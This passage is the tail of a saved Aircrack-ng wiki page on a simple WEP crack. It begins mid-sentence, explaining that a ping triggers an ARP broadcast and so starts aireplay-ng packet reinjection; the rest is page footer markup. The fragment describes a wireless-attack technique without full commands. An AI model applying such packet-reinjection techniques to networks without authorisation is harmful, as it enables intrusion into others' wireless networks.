192.168.1.213”.  This will cause an ARP to be broadcast via your 
wireless access point and in turn, this will kick off the reinjection of
 packets by aireplay-ng.
</p>

</div>

                    <!-- wikipage stop -->
                                    </div>

                <div class="docInfo">simple_wep_crack.txt · Last modified: 2010/08/29 19:41 by mister_x</div>

                            </div></div><!-- /content -->

            <hr class="a11y">

            <!-- PAGE ACTIONS -->
            <div id="dokuwiki__pagetools">
                <h3 class="a11y">Page Tools</h3>
                <div class="tools">
                    <ul>
                        <li><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack&amp;do=edit&amp;rev=0" class="action source" accesskey="v" rel="nofollow" title="Show pagesource [V]"><span>Show pagesource</span></a></li><li><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack&amp;do=revisions" class="action revs" accesskey="o" rel="nofollow" title="Old revisions [O]"><span>Old revisions</span></a></li><li><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack&amp;do=backlink" class="action backlink" rel="nofollow" title="Backlinks"><span>Backlinks</span></a></li><li><a href="#dokuwiki__top" class="action top" accesskey="t" rel="nofollow" title="Back to top [T]"><span>Back to top</span></a></li>                    </ul>
                </div>
            </div>
        </div><!-- /wrapper -->

        
<!-- ********** FOOTER ********** -->
<div id="dokuwiki__footer"><div class="pad">
    <div class="license">Except where otherwise noted, content on this wiki is licensed under the following license: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/" rel="license" class="urlextern">CC Attribution-Noncommercial-Share Alike 3.0 Unported</a></div>
    <div class="buttons">
        <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/" rel="license"><img src="simple_wep_crack%20%5BAircrack-ng%5D_files/cc-by-nc-sa.png" alt="CC Attribution-Noncommercial-Share Alike 3.0 Unported"></a>        <a href="http://www.dokuwiki.org/donate" title="Donate"><img src="simple_wep_crack%20%5BAircrack-ng%5D_files/button-donate.gif" alt="Donate" height="15" width="80"></a>
        <a href="http://www.php.net/" title="Powered by PHP"><img src="simple_wep_crack%20%5BAircrack-ng%5D_files/button-php.gif" alt="Powered by PHP" height="15" width="80"></a>
        <a href="http://validator.w3.org/check/referer" title="Valid HTML5"><img src="simple_wep_crack%20%5BAircrack-ng%5D_files/button-html5.png" alt="Valid HTML5" height="15" width="80"></a>
        <a href="http://jigsaw.w3.org/css-validator/check/referer?profile=css3" title="Valid CSS"><img src="simple_wep_crack%20%5BAircrack-ng%5D_files/button-css.png" alt="Valid CSS" height="15" width="80"></a>
        <a href="http://dokuwiki.org/" title="Driven by DokuWiki"><img src="simple_wep_crack%20%5BAircrack-ng%5D_files/button-dw.png" alt="Driven by DokuWiki" height="15" width="80"></a>
    </div>
</div></div><!-- /footer -->

    </div></div><!-- /site -->

    <div class="no"><img src="simple_wep_crack%20%5BAircrack-ng%5D_files/indexer.gif" alt="" height="1" width="2"></div>
    <div id="screen__mode" class="no"></div>    <!--[if ( lte IE 7 | IE 8 ) ]></div><![endif]-->


</body></html>